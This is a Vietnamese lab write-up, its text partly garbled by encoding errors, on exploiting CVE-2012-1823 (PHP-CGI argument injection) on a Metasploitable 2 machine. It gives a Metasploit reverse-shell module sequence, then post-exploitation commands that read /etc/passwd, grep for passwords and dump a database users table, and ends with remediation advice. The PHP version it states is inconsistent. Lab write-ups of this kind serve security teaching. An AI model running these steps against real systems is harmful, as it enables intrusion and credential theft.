# ğŸ›¡ï¸Remote Code Execution thÃ´ng qua PHP-CGI Argument Injection
> - **TÃªn lá»— há»ng:** PHP CGI Argument Injection
> - **MÃ£ CVE:** CVE-2012-1823
> - **Má»©c Ä‘á»™:** Cao
> - **NgÃ y phÃ¡t hiá»‡n:** 2012
## ğŸ§± 1. MÃ´ táº£ lá»— há»•ng
Há»‡ thá»‘ng web hiá»‡n Ä‘ang cháº¡y PHP 5.2.4 vá»›i mÃ´ hÃ¬nh xá»­ lÃ½ CGI. ÄÃ¢y lÃ  má»™t phiÃªn báº£n Ä‘Ã£ quÃ¡ cÅ© (phÃ¡t hÃ nh nÄƒm 2007) vÃ  chá»©a lá»— há»•ng argument injection, cho phÃ©p káº» táº¥n cÃ´ng chÃ¨n cÃ¡c tham sá»‘ tÃ¹y Ã½ (-d allow_url_include=on, -d auto_prepend_file=php://input, v.v...) dáº«n Ä‘áº¿n thá»±c thi mÃ£ tá»« xa (RCE).
## Ká»¹ thuáº­t khai thÃ¡c:
- Gá»­i má»™t HTTP request cÃ³ ? chá»©a argument báº¥t há»£p lá»‡ vÃ o php-cgi
- Truyá»n mÃ£ PHP Ä‘á»™c háº¡i thÃ´ng qua POST
- Káº¿t quáº£: shell Ä‘Æ°á»£c thá»±c thi tá»« xa
## âš’ï¸ 2. Thá»­ nghiá»‡m thá»±c táº¿
- QUYÃ‰T MÃY CHá»¦ Ä‘á»ƒ tÃ¬m thÃ´ng tin vá» phiÃªn báº£n web server:

<img width="704" height="259" alt="image" src="https://github.com/user-attachments/assets/d9664fec-59cf-4cb9-8c63-3083583190b1" />

- Sau khi xÃ¡c minh Ä‘Æ°á»£c phiÃªn báº£n PHP trÃªn web server lÃ  5.4.2. TÃ¬m kiáº¿m cÃ¡c lá»— há»•ng báº£o máº­t cÃ³ liÃªn quan:
```
sudo msfconsole
```

```
searchsploit apache | grep 5.4.2
```

```
search php_cgi
```

- Sá»­ dá»¥ng module php_cgi_arg_injection cá»§a Metataploit Ä‘á»ƒ chiáº¿m shell trÃªn Metasploitable
```
use multi/http/php_cgi_arg_injection
```

```
set rhost <IP Metasploitable 2>
set lhost
set lport
```

```
set PAYLOAD php/meterpreter/reverse_tcp
```

```
exploit
```

```
shell
```
- âš”ï¸ 1. Kiá»ƒm tra thÃ´ng tin há»‡ thá»‘ng
```
uname -a          # ThÃ´ng tin kernel
id                # Kiá»ƒm tra UID, GID
```

- ğŸ” 2. Kiá»ƒm tra cÃ¡c user trÃªn há»‡ thá»‘ng
```
cat /etc/passwd
```

- ğŸ“ 4. KhÃ¡m phÃ¡ thÆ° má»¥c home, cÃ³ thá»ƒ chá»©a thÃ´ng tin nháº¡y cáº£m
```
cd /home
ls -la
```

- ğŸ”‘ 5. TÃ¬m kiáº¿m thÃ´ng tin nháº¡y cáº£m: máº­t kháº©u, private key, cáº¥u hÃ¬nh database
```
find /var/www -type f -iname "*config*.php"
```

Äáº·c biá»‡t chÃº Ã½ cÃ¡c file trong dvwa, mutillidae, phpMyAdmin, tikiwiki:
```
cat /var/www/dvwa/config/config.inc.php
cat /var/www/mutillidae/config.inc.php
```

<img width="950" height="441" alt="image" src="https://github.com/user-attachments/assets/c4b0795d-7993-4b1a-9906-8b4096b8592f" />

- ğŸ”„ 7. Náº¿u cÃ³ thÃ´ng tin Ä‘Äƒng nháº­p MySQL, thá»­ Ä‘Äƒng nháº­p:
```
mysql -u root -p
```

- ğŸ§± 8. Kiá»ƒm tra cÃ¡c tiáº¿n trÃ¬nh Ä‘ang cháº¡y, dá»‹ch vá»¥ kháº£ nghi
```
ps aux
```

- ğŸ” 1. TÃ¬m kiáº¿m file chá»©a máº­t kháº©u trong thÆ° má»¥c web
```
grep -Ri 'pass\|user' /var/www/
```

- ğŸ” 2. Xem ná»™i dung cÃ¡c thÆ° má»¥c /home
```
ls -la /home/msfadmin
ls -la /home/user
ls -la /home/service
```

-EXPLOIT DATABASES:
```
mysql -u root -p
```

```
show databases;
```

```
USE dvwa;
SHOW TABLES;
SELECT * FROM users;
```

```
exit
```

- THá»°C HIá»†N CHÃM SHELL
```
python -c 'import pty; pty.spawn("/bin/bash")'
```

```
su users
```
hoáº·c
```
su msfadmin
# máº­t kháº©u: msfadmin hoáº·c password
```

- XEM SETTING
```
show options
```
## ğŸ“‰ 3. Rá»§i ro an ninh

| Má»©c Ä‘á»™                 | MÃ´ táº£                                            |
| ---------------------- | ------------------------------------------------ |
| **TÃ¡c Ä‘á»™ng**           | ToÃ n bá»™ há»‡ thá»‘ng cÃ³ thá»ƒ bá»‹ chiáº¿m quyá»n kiá»ƒm soÃ¡t |
| **Kháº£ nÄƒng khai thÃ¡c** | Ráº¥t cao â€“ cÃ´ng cá»¥ cÃ´ng khai, khÃ´ng cáº§n xÃ¡c thá»±c  |
| **Háº­u quáº£ tiá»m áº©n**    | RÃ² rá»‰ dá»¯ liá»‡u, chÃ¨n web shell, pivot máº¡ng ná»™i bá»™ |

## ğŸ§  VÃ¬ sao láº¡i thuá»™c nhÃ³m "Vulnerable and Outdated Components"?

| TiÃªu chÃ­                                 | CÃ³ khá»›p khÃ´ng?                        |
| ---------------------------------------- | ------------------------------------- |
| âŒ Pháº§n má»m khÃ´ng Ä‘Æ°á»£c cáº­p nháº­t           | âœ… PHP 5.2.4 quÃ¡ cÅ© (2007)             |
| âš ï¸ Lá»— há»•ng Ä‘Ã£ cÃ´ng bá»‘ vÃ  cÃ³ mÃ£ khai thÃ¡c | âœ… CVE-2012-1823                       |
| ğŸ”¥ Hacker cÃ³ thá»ƒ khai thÃ¡c tá»« xa         | âœ… Táº¥n cÃ´ng RCE thÃ nh cÃ´ng             |
| ğŸ” KhÃ´ng cÃ³ kiá»ƒm soÃ¡t an ninh bÃ¹         | âœ… KhÃ´ng dÃ¹ng WAF hoáº·c cáº¥u hÃ¬nh báº£o vá»‡ |

## ğŸ›¡ï¸ 4. Äá» xuáº¥t kháº¯c phá»¥c

| HÃ nh Ä‘á»™ng               | Chi tiáº¿t                                                      |
| ----------------------- | ------------------------------------------------------------- |
| ğŸ”„ **Cáº­p nháº­t PHP**     | NÃ¢ng cáº¥p PHP lÃªn Ã­t nháº¥t phiÃªn báº£n **7.4 trá»Ÿ lÃªn**            |
| ğŸ” **Táº¯t PHP-CGI**      | Náº¿u khÃ´ng báº¯t buá»™c dÃ¹ng CGI, táº¯t hoÃ n toÃ n module             |
| ğŸš§ **Cáº¥u hÃ¬nh WAF/IDS** | Triá»ƒn khai WAF (ModSecurity, v.v...) Ä‘á»ƒ lá»c tham sá»‘ nguy hiá»ƒm |
| ğŸ§¹ **Quáº£n lÃ½ báº£n vÃ¡**   | Thiáº¿t láº­p lá»‹ch cáº­p nháº­t pháº§n má»m Ä‘á»‹nh ká»³                      |
## Tham Kháº£o
- https://github.com/0xl0k1/CVE-2012-1823
## âœ… Káº¿t Luáº­n
## NOTEs

- **metaploit2**

| TrÆ°á»ng       | GiÃ¡ trá»‹    |
| ------------ | ---------- |
| **Username** | `msfadmin` |
| **Password** | `msfadmin` |

```
sudo ifconfig eth0 192.168.80.10 netmask 255.255.255.0 up 
```
